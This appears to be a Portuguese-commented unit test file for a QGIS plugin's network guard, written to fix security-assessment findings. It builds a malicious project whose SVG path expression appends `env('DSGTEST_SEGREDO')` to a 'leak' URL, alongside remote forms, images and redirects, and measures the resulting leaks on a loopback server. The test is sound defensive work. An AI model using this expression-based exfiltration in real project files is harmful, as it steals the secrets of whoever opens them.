# -*- coding: utf-8 -*-
"""
Guarda de rede para recurso de projeto (avaliação de segurança do CDCiber,
2026, achados 4.3 e 4.4).

Um receptor HTTP no loopback (porta livre, só 127.0.0.1) faz o papel do
servidor do autor do projeto. O projeto de terceiro, gravado em pasta
temporária com camadas GeoPackage, aponta SVG remoto, SVG atrás de 302, SVG
cujo caminho é `'http://.../leak?v=' || env('VAR')` e formulário .ui remoto.
A leitura é a da estação que só ABRE o projeto: lê e desenha.

Sem o pacote DsgTools.core.Security (código anterior à correção) os testes
rodam sem guarda e reprovam pelo vazamento medido no receptor, não pelo
import.
"""
import json
import os
import shutil
import struct
import tempfile
import threading
import time
import unittest
import uuid
import zlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from qgis.core import (
    Qgis,
    QgsApplication,
    QgsBlockingNetworkRequest,
    QgsCoordinateReferenceSystem,
    QgsMapRendererSequentialJob,
    QgsMapSettings,
    QgsLayoutItemPicture,
    QgsMarkerSymbol,
    QgsNetworkAccessManager,
    QgsPrintLayout,
    QgsProject,
    QgsProperty,
    QgsRasterLayer,
    QgsRectangle,
    QgsSettings,
    QgsSingleSymbolRenderer,
    QgsSvgMarkerSymbolLayer,
    QgsSymbolLayer,
    QgsVectorLayer,
)
from qgis.PyQt.QtCore import QCoreApplication, QSize, QUrl
from qgis.PyQt.QtNetwork import QNetworkRequest
from qgis.testing import start_app

start_app()

try:
    from DsgTools.core.Security import NetworkGuard
except ImportError:  # código anterior à correção
    NetworkGuard = None

TAG = "DSGTools Segurança"
CHAVE_MODO = "dsgtools/security/resourceMode"
CHAVE_HOSTS = "dsgtools/security/allowedHosts"
SEGREDO = "valor_artificial_44"
# Porta morta só para MONTAR o projeto; o texto é trocado pela porta real.
PORTA_MOLDE, PORTA_MOLDE_REDIR, TOKEN_MOLDE = 1, 2, "TOKENMOLDE"


def _png():
    def bloco(tipo, dados):
        return struct.pack(">I", len(dados)) + tipo + dados + struct.pack(">I", zlib.crc32(tipo + dados) & 0xFFFFFFFF)

    linhas = b"".join(b"\0" + b"\xff\0\0\xff" * 256 for _ in range(256))
    return (
        b"\x89PNG\r\n\x1a\n"
        + bloco(b"IHDR", struct.pack(">IIBBBBB", 256, 256, 8, 6, 0, 0, 0))
        + bloco(b"IDAT", zlib.compress(linhas))
        + bloco(b"IEND", b"")
    )


PNG = _png()
SVG = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><circle cx="5" cy="5" r="4" fill="red"/></svg>'
UI = (
    b'<?xml version="1.0" encoding="UTF-8"?><ui version="4.0"><class>Form</class>'
    b'<widget class="QWidget" name="Form"/></ui>'
)


def _capacidadesWms(porta):
    return (
        '<?xml version="1.0"?><WMS_Capabilities version="1.3.0" xmlns="http://www.opengis.net/wms" '
        'xmlns:xlink="http://www.w3.org/1999/xlink"><Service><Name>WMS</Name><Title>t</Title></Service>'
        "<Capability><Request><GetCapabilities><Format>text/xml</Format></GetCapabilities><GetMap>"
        f'<Format>image/png</Format><DCPType><HTTP><Get><OnlineResource xlink:href="http://127.0.0.1:{porta}/wms?"/>'
        "</Get></HTTP></DCPType></GetMap></Request><Layer><Title>r</Title><CRS>EPSG:4326</CRS>"
        "<EX_GeographicBoundingBox><westBoundLongitude>-180</westBoundLongitude><eastBoundLongitude>180"
        "</eastBoundLongitude><southBoundLatitude>-90</southBoundLatitude><northBoundLatitude>90"
        "</northBoundLatitude></EX_GeographicBoundingBox><Layer queryable=\"0\"><Name>a</Name><Title>a</Title>"
        '<CRS>EPSG:4326</CRS><BoundingBox CRS="EPSG:4326" minx="-90" miny="-180" maxx="90" maxy="180"/>'
        "</Layer></Layer></Capability></WMS_Capabilities>"
    ).encode()


class Receptor:
    """Servidor HTTP no loopback que registra cada caminho pedido; opcionalmente redireciona (302)."""

    def __init__(self, redirecionaPara=None):
        self.caminhos = []
        trava = threading.Lock()
        receptor = self

        class Tratador(BaseHTTPRequestHandler):
            def do_GET(self):
                with trava:
                    receptor.caminhos.append(self.path)
                if redirecionaPara is not None:
                    self.send_response(302)
                    self.send_header("Location", f"http://127.0.0.1:{redirecionaPara.porta}{self.path}")
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                p = self.path.lower()
                if "getcapabilities" in p and "wms" in p:
                    corpo, tipo = _capacidadesWms(receptor.porta), "text/xml"
                elif "getmap" in p or "/tiles/" in p or p.endswith(".png"):
                    corpo, tipo = PNG, "image/png"
                elif p.endswith(".ui"):
                    corpo, tipo = UI, "application/xml"
                elif p.endswith(".svg") or "leak" in p:
                    corpo, tipo = SVG, "image/svg+xml"
                else:
                    corpo, tipo = b"ok", "text/plain"
                self.send_response(200)
                self.send_header("Content-Type", tipo)
                self.send_header("Content-Length", str(len(corpo)))
                self.end_headers()
                self.wfile.write(corpo)

            def log_message(self, *a):
                pass

        self.servidor = ThreadingHTTPServer(("127.0.0.1", 0), Tratador)
        self.servidor.daemon_threads = True
        self.porta = self.servidor.server_address[1]
        self.thread = threading.Thread(target=self.servidor.serve_forever, daemon=True)
        self.thread.start()

    def com(self, trecho):
        return [c for c in list(self.caminhos) if trecho in c]

    def fechar(self):
        self.servidor.shutdown()
        self.servidor.server_close()


def sinalDoLog():
    # No QGIS 4.2.1 o messageReceived(mensagem, tag, nível) não chega ao Python;
    # o messageReceivedWithFormat chega (medido).
    log = QgsApplication.messageLog()
    if hasattr(log, "messageReceivedWithFormat"):
        return log.messageReceivedWithFormat
    return log.messageReceived[str, str, Qgis.MessageLevel]


def espera(segundos):
    fim = time.time() + segundos
    while time.time() < fim:
        QCoreApplication.processEvents()
        time.sleep(0.05)


def desenhar(camadas, repeticoes=2):
    ms = QgsMapSettings()
    ms.setLayers(camadas)
    ms.setDestinationCrs(QgsCoordinateReferenceSystem("EPSG:4326"))
    ms.setExtent(QgsRectangle(-1, -1, 1, 1))
    ms.setOutputSize(QSize(200, 200))
    for _ in range(repeticoes):
        job = QgsMapRendererSequentialJob(ms)
        job.start()
        job.waitForFinished()
        espera(1.5)


def camadaGpkg(pasta, nome):
    from osgeo import ogr, osr

    arq = os.path.join(pasta, f"{nome}.gpkg")
    ds = ogr.GetDriverByName("GPKG").CreateDataSource(arq)
    srs = osr.SpatialReference()
    srs.ImportFromEPSG(4326)
    lay = ds.CreateLayer(nome, srs, ogr.wkbPoint)
    lay.CreateField(ogr.FieldDefn("nome", ogr.OFTString))
    feat = ogr.Feature(lay.GetLayerDefn())
    feat.SetField("nome", "x")
    feat.SetGeometry(ogr.CreateGeometryFromWkt("POINT (0 0)"))
    lay.CreateFeature(feat)
    ds = None
    return QgsVectorLayer(f"{arq}|layername={nome}", nome, "ogr")


def montarMolde(pasta):
    """
    Grava o projeto de terceiro com porta e token de MOLDE; cada teste troca o
    texto por porta real e token novo (URL nova, sem cache de SVG nem de .ui).
    Enquanto monta, toda requisição é desviada para que nada saia.
    """
    desvio = QgsNetworkAccessManager.setRequestPreprocessor(lambda r: (r.setUrl(QUrl("bloqueado:")), "")[1])
    try:
        projeto = QgsProject.instance()
        projeto.clear()
        base = f"http://127.0.0.1:{PORTA_MOLDE}/{TOKEN_MOLDE}"
        casos = {
            "svg_remoto": f"{base}/svg_remoto.svg",
            "svg_redirecionado": f"http://127.0.0.1:{PORTA_MOLDE_REDIR}/{TOKEN_MOLDE}/svg_redirecionado.svg",
            "svg_env": None,
        }
        for nome, url in casos.items():
            camada = camadaGpkg(pasta, nome)
            simbolo = QgsSvgMarkerSymbolLayer(url or "x.svg", 5)
            if url is None:
                simbolo.setDataDefinedProperty(
                    QgsSymbolLayer.Property.Name,
                    QgsProperty.fromExpression(f"'{base}/leak?v=' || env('DSGTEST_SEGREDO')"),
                )
            marcador = QgsMarkerSymbol()
            marcador.changeSymbolLayer(0, simbolo)
            camada.setRenderer(QgsSingleSymbolRenderer(marcador))
            projeto.addMapLayer(camada)
        # O .ui remoto chega SEM iniciador; a URL sem extensão .ui exercita o
        # registro de caminhos lidos do projeto, não o sufixo.
        for nome, url in (
            ("form_remoto", f"{base}/form_remoto.ui"),
            ("form_sem_extensao", f"{base}/formulario?id=7"),
        ):
            form = camadaGpkg(pasta, nome)
            config = form.editFormConfig()
            config.setLayout(Qgis.AttributeFormLayout.UiFile)
            config.setUiForm(url)
            form.setEditFormConfig(config)
            projeto.addMapLayer(form)
        # Figura remota em prancha (iniciador QgsNetworkContentFetcher).
        prancha = QgsPrintLayout(projeto)
        prancha.initializeDefaults()
        prancha.setName("prancha")
        figura = QgsLayoutItemPicture(prancha)
        figura.setPicturePath(f"{base}/figura_prancha.png")
        prancha.addLayoutItem(figura)
        projeto.layoutManager().addLayout(prancha)
        arq = os.path.join(pasta, "molde.qgs")
        assert projeto.write(arq), "não gravou o projeto de molde"
        espera(1)
        projeto.clear()
    finally:
        QgsNetworkAccessManager.removeRequestPreprocessor(desvio)
    with open(arq, encoding="utf-8") as f:
        texto = f.read()
    for trecho in (
        f"127.0.0.1:{PORTA_MOLDE}/{TOKEN_MOLDE}/svg_remoto.svg",
        "form_remoto.ui",
        "formulario?id=7",
        "figura_prancha.png",
        "env(",
    ):
        assert trecho in texto, f"o projeto de molde não guardou {trecho!r}"
    return texto


class TestNetworkGuard(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        os.environ["DSGTEST_SEGREDO"] = SEGREDO
        cls.pasta = tempfile.mkdtemp(prefix="dsgtest_rede_")
        cls.molde = montarMolde(cls.pasta)
        cls.alvo = Receptor()
        cls.redir = Receptor(redirecionaPara=cls.alvo)
        cls.log = []
        sinalDoLog().connect(cls._aoLogar)
        s = QgsSettings()
        cls.original = {k: s.value(k) for k in (CHAVE_MODO, CHAVE_HOSTS)}

    @classmethod
    def _aoLogar(cls, mensagem, tag, nivel, *resto):
        if tag == TAG:
            cls.log.append(mensagem)

    @classmethod
    def tearDownClass(cls):
        QgsProject.instance().clear()
        try:
            sinalDoLog().disconnect(cls._aoLogar)
        except TypeError:
            pass
        s = QgsSettings()
        for chave, valor in cls.original.items():
            if valor is None:
                s.remove(chave)
            else:
                s.setValue(chave, valor)
        cls.alvo.fechar()
        cls.redir.fechar()
        shutil.rmtree(cls.pasta, ignore_errors=True)

    def setUp(self):
        self.guarda = None
        type(self).log.clear()

    def tearDown(self):
        if self.guarda is not None:
            self.guarda.uninstall()
        QgsProject.instance().clear()

    # apoio ---------------------------------------------------------------
    def configurar(self, modo="block", hosts=()):
        s = QgsSettings()
        s.setValue(CHAVE_MODO, modo)
        s.setValue(CHAVE_HOSTS, list(hosts))

    def instalarGuarda(self):
        if NetworkGuard is not None:
            self.guarda = NetworkGuard(None)
            self.guarda.install()
        return self.guarda

    def abrirProjeto(self):
        """Copia o molde com porta real e token novo, abre e desenha; devolve o token."""
        token = "t" + uuid.uuid4().hex[:10]
        texto = (
            self.molde.replace(f"127.0.0.1:{PORTA_MOLDE_REDIR}/", f"127.0.0.1:{self.redir.porta}/")
            .replace(f"127.0.0.1:{PORTA_MOLDE}/", f"127.0.0.1:{self.alvo.porta}/")
            .replace(TOKEN_MOLDE, token)
        )
        arq = os.path.join(self.pasta, f"{token}.qgs")
        with open(arq, "w", encoding="utf-8") as f:
            f.write(texto)
        projeto = QgsProject.instance()
        self.assertTrue(projeto.read(arq), "não releu o projeto")
        camadas = list(projeto.mapLayers().values())
        self.assertEqual(len(camadas), 5, [c.name() for c in camadas])
        self.assertTrue(all(c.isValid() for c in camadas))
        desenhar(camadas)
        espera(2)
        return token

    def resumo(self, token):
        return json.dumps(
            {"alvo": self.alvo.com(token), "redirecionador": self.redir.com(token), "log": self.log[-6:]},
            ensure_ascii=False,
        )

    # testes --------------------------------------------------------------
    def test_controle_sem_guarda_o_projeto_busca_na_rede(self):
        # Prova que o instrumento enxerga o vazamento: sem guarda, tudo chega.
        token = self.abrirProjeto()
        alvo = self.alvo.com(token)
        self.assertTrue([c for c in alvo if c.endswith("/svg_remoto.svg")], self.resumo(token))
        self.assertTrue([c for c in alvo if SEGREDO in c], self.resumo(token))
        self.assertTrue([c for c in alvo if c.endswith("/form_remoto.ui")], self.resumo(token))
        self.assertTrue([c for c in alvo if "/formulario?id=7" in c], self.resumo(token))
        self.assertTrue([c for c in alvo if c.endswith("/figura_prancha.png")], self.resumo(token))
        self.assertTrue(self.redir.com(token), self.resumo(token))

    def test_sem_destino_permitido_nenhum_recurso_sai(self):
        self.configurar("block", [])
        guarda = self.instalarGuarda()
        token = self.abrirProjeto()
        self.assertEqual(self.alvo.com(token), [], self.resumo(token))
        self.assertEqual(self.redir.com(token), [], self.resumo(token))
        self.assertIsNotNone(guarda, "pacote DsgTools.core.Security ausente")
        self.assertGreaterEqual(guarda.bloqueios, 6)
        bloqueios = [m for m in self.log if "bloqueada" in m and token in m]
        for trecho in (
            "/svg_remoto.svg",
            "/leak",
            "/form_remoto.ui",
            "/formulario",
            "/svg_redirecionado.svg",
            "/figura_prancha.png",
        ):
            self.assertTrue([m for m in bloqueios if trecho in m], f"{trecho} sem registro: {self.resumo(token)}")
        # O log não guarda a query, onde a expressão pôs o valor de env().
        self.assertFalse([m for m in self.log if SEGREDO in m])

    def test_env_nao_sai_no_endereco(self):
        self.configurar("block", [])
        self.instalarGuarda()
        token = self.abrirProjeto()
        vazou = [c for c in self.alvo.caminhos + self.redir.caminhos if token in c and SEGREDO in c]
        self.assertEqual(vazou, [], self.resumo(token))
        self.assertTrue([m for m in self.log if token in m and "/leak" in m and "bloqueada" in m], self.resumo(token))

    def test_redirecionamento_barrado_no_destino_final(self):
        # O redirecionador é permitido; o 302 aponta para o alvo, que não é.
        self.configurar("block", [f"127.0.0.1:{self.redir.porta}"])
        self.instalarGuarda()
        token = self.abrirProjeto()
        self.assertTrue([c for c in self.redir.com(token) if "svg_redirecionado.svg" in c], self.resumo(token))
        self.assertEqual(self.alvo.com(token), [], self.resumo(token))
        self.assertTrue(
            [m for m in self.log if token in m and "svg_redirecionado.svg" in m and f":{self.alvo.porta}" in m],
            self.resumo(token),
        )

    def test_destino_permitido_recebe(self):
        self.configurar("block", [f"127.0.0.1:{self.alvo.porta}", f"127.0.0.1:{self.redir.porta}"])
        self.instalarGuarda()
        token = self.abrirProjeto()
        alvo = self.alvo.com(token)
        self.assertTrue([c for c in alvo if c.endswith("/svg_remoto.svg")], self.resumo(token))
        self.assertTrue([c for c in alvo if c.endswith("/svg_redirecionado.svg")], self.resumo(token))
        self.assertTrue([c for c in alvo if SEGREDO in c], self.resumo(token))
        self.assertTrue([c for c in alvo if c.endswith("/form_remoto.ui")], self.resumo(token))
        self.assertTrue([c for c in alvo if "/formulario?id=7" in c], self.resumo(token))
        self.assertTrue([c for c in alvo if c.endswith("/figura_prancha.png")], self.resumo(token))

    def test_modo_warn_avisa_sem_barrar(self):
        self.configurar("warn", [])
        self.instalarGuarda()
        token = self.abrirProjeto()
        self.assertTrue(self.alvo.com(token), self.resumo(token))
        self.assertTrue([m for m in self.log if token in m and "modo warn" in m], self.resumo(token))

    def test_provedor_de_dados_nao_e_barrado(self):
        # Modo block e nenhum destino permitido: o tráfego de provedor passa.
        self.configurar("block", [])
        self.instalarGuarda()
        token = "p" + uuid.uuid4().hex[:10]
        base = f"http://127.0.0.1:{self.alvo.porta}"
        xyz = QgsRasterLayer(
            f"type=xyz&url={base}/{token}/tiles/%7Bz%7D/%7Bx%7D/%7By%7D.png&zmax=19&zmin=0", "xyz", "wms"
        )
        self.assertTrue(xyz.isValid())
        desenhar([xyz])
        self.assertTrue(self.alvo.com(f"/{token}/tiles/"), self.resumo(token))
        wms = QgsRasterLayer(f"crs=EPSG:4326&format=image/png&layers=a&styles=&url={base}/{token}/wms", "wms", "wms")
        self.assertTrue(wms.isValid(), self.resumo(token))
        self.assertTrue(
            [c for c in self.alvo.com(f"/{token}/wms") if "GetCapabilities" in c], self.resumo(token)
        )
        # Caminho do BDGEx (QgsBlockingNetworkRequest) e de plugin (get direto).
        bloqueante = QgsBlockingNetworkRequest()
        erro = bloqueante.get(QNetworkRequest(QUrl(f"{base}/{token}/bdgex_simulado")))
        self.assertEqual(erro, QgsBlockingNetworkRequest.ErrorCode.NoError, bloqueante.errorMessage())
        resposta = QgsNetworkAccessManager.instance().get(QNetworkRequest(QUrl(f"{base}/{token}/sap_simulado")))
        espera(1.5)
        self.assertTrue(self.alvo.com(f"/{token}/sap_simulado"), self.resumo(token))
        resposta.deleteLater()
        self.assertFalse([m for m in self.log if token in m], self.resumo(token))

    def test_desinstalar_remove_o_filtro(self):
        self.configurar("block", [])
        guarda = self.instalarGuarda()
        self.assertIsNotNone(guarda, "pacote DsgTools.core.Security ausente")
        guarda.uninstall()
        self.guarda = None
        token = self.abrirProjeto()
        self.assertTrue(self.alvo.com(token), self.resumo(token))


if __name__ == "__main__":
    unittest.main()
